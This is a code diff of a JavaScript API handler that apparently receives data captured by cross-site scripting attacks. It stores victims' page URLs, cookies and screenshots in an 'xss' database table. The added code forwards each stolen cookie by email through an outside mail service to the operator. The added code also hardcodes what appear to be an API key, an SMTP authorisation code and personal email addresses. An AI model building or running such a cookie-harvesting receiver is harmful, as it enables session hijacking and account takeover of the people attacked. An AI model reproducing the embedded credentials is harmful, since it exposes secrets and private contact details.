@@ -15,37 +15,76 @@ export default async function handler(req, res) {
 
   if (req.method === 'POST') {
     try {
-      // 获取请求体中的数据
       const { url = 'null', cookie = 'null', screenshot } = req.body;
 
       // 获取当前的中国时间
       const chinaTime = moment().tz('Asia/Shanghai').format('YYYY-MM-DD HH:mm:ss');
 
-      // 验证请求体是否包含必要字段
+      // ==== 异步插入 Supabase 数据库（不阻塞主流程）====
+      insertToSupabaseAsync(url, cookie, screenshot, chinaTime).catch((dbError) => {
+        console.error('数据库插入失败（异步）:', dbError);
+      });
 
-      // 插入数据到 Supabase 的 xss 表
-      const { data, error } = await supabase
-        .from('xss')
-        .insert([{ url, cookie, screenshot, trigger_time: chinaTime }])
-        .single();
+      // ==== 异步发送邮件通知（不阻塞主流程）====
+      sendEmailNotification(url, cookie).catch((mailError) => {
+        console.error('邮件发送失败（异步）:', mailError);
+      });
 
-      if (error) {
-        console.error('插入数据时出错:', error);
-        return res.status(500).json({ error: '插入数据失败', details: error.message });
-      }
-
-      // 返回成功响应
+      // 立即返回成功响应，不等待数据库和邮件操作完成
       res.status(200).json({
-        message: '数据插入成功',
-        insertedData: data,
+        message: '请求已接收，数据正在异步处理',
       });
     } catch (error) {
       console.error('处理 POST 请求时出错:', error);
       res.status(500).json({ error: '服务器内部错误' });
     }
   } else {
-    // 如果不是 POST 请求，返回 405 Method Not Allowed
     res.setHeader('Allow', ['POST']);
     res.status(405).end(`Method ${req.method} Not Allowed`);
   }
+}
+
+// ===== 异步插入 Supabase 函数 =====
+async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {
+
+  const { data, error } = await supabase
+    .from('xss')
+    .insert([{ url, cookie, screenshot, trigger_time }]);
+
+  if (error) {
+    throw new Error(`插入数据库失败: ${error.message}`);
+  }
+
+  console.log('数据已异步插入 Supabase:', data);
+}
+
+// ===== 异步发送邮件函数 =====
+async function sendEmailNotification(url, cookie) {
+  const mailOptions = {
+    ColaKey: "b4S8aGLd0qkzJU1747541550124HWLfTnPixQ",
+    tomail: '1445600537@qq.com',
+    fromTitle: 'XSS Alert',
+    subject: '新 XSS 攻击触发通知',
+    smtpCode: "GZVNbreC39GVax3z",
+    smtpEmail: "chain00x@163.com",
+    smtpCodeType: '163',
+    isTextContent: false,
+    content: `
+      <h2>检测到新的 XSS 触发</h2>
+      <p><strong>URL:</strong> ${url}</p>
+      <p><strong>Cookie:</strong> ${cookie}</p>
+      <p><strong>时间:</strong> ${new Date().toLocaleString()}</p>
+    `,
+  };
+
+  const response = await fetch('https://luckycola.com.cn/tools/customMail ', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(mailOptions),
+  });
+
+  const result = await response.json();
+  console.log('邮件发送结果:', result);
 }
